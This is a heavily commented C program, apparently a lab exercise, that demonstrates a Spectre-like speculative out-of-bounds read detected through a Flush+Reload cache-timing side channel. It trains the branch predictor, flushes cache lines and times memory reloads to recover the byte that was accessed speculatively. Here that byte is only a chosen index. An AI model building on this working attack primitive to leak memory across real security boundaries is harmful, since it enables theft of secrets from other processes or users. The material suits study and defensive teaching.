#include <emmintrin.h>
#include <x86intrin.h>
#include <stdio.h>
#include <stdint.h>

int size = 10;  // Bounds check limit (simulated for victim function)

// Probe array used in the Flush+Reload side channel.
// Each slot is spaced by 4096 bytes to avoid false sharing and prefetching.
uint8_t array[256*4096];  

// Temporary variable to prevent compiler optimizations.
uint8_t temp = 0;

#define CACHE_HIT_THRESHOLD (80)  // Threshold (in cycles) to detect cache hit
#define DELTA 1024                // Offset added to prevent hardware prefetching

// -------------------------------------------------------------
// Flush the probe array from the CPU cache to prepare for attack
// -------------------------------------------------------------
void flushSideChannel()
{
  int i;
  // Step 1: Write to every page of the array to ensure it's mapped in RAM
  // (Prevent Copy-On-Write mechanism from interfering)
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;

  // Step 2: Use CLFLUSH to flush each page from the CPU cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

// -------------------------------------------------------------
// Reload probe array and measure access time to infer secret value
// -------------------------------------------------------------
void reloadSideChannel()
{
  int junk=0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;

  // Iterate over all 256 possible values
  for(i = 0; i < 256; i++){
    addr = &array[i*4096 + DELTA];

    // Measure access time to current cache line
    time1 = __rdtscp(&junk);     // Read timestamp before access
    junk = *addr;                // Actual memory access (possibly cached)
    time2 = __rdtscp(&junk) - time1; // Time difference (in CPU cycles)

    // If access is faster than threshold, assume it was cached
    if (time2 <= CACHE_HIT_THRESHOLD){
        printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
        printf("The Secret = %d.\n",i);  // Leaked byte
    }
  } 
}

// -------------------------------------------------------------
// Victim function that enforces a bounds check on x,
// but may be speculatively bypassed by the CPU.
// -------------------------------------------------------------
void victim(size_t x)
{
  // Speculative execution may execute the array access even if x >= size
  if (x < size) {  
    temp = array[x * 4096 + DELTA];  // Potential out-of-bounds read
  }
}

// -------------------------------------------------------------
// Main driver: perform Spectre-like attack using Flush+Reload
// -------------------------------------------------------------
int main() {
  int i;

  // -----------------------------
  // 1. "Train" the branch predictor:
  //    Repeatedly call victim() with x < size so that the CPU learns
  //    to predict the if-condition as true.
  // -----------------------------
  for (i = 0; i < 10; i++) {   
     _mm_clflush(&size);     // Flush 'size' so CPU has to fetch from memory
     victim(i);              // Legal access (x < size)
  }

  // -----------------------------
  // 2. Flush the probe array from cache
  //    This ensures we start from a known uncached state.
  // -----------------------------
  flushSideChannel();

  // -----------------------------
  // 3. Attack phase:
  //    Provide an illegal value (x = 97) that violates bounds check,
  //    but may still get speculatively executed.
  // -----------------------------
  _mm_clflush(&size);     // Delay branch resolution by flushing 'size'
  victim(97);             // Illegal access, but CPU might speculate

  // -----------------------------
  // 4. Reload phase:
  //    Scan the probe array to see which index was loaded into cache,
  //    thereby revealing the speculatively accessed (secret) value.
  // -----------------------------
  reloadSideChannel();

  return (0); 
}
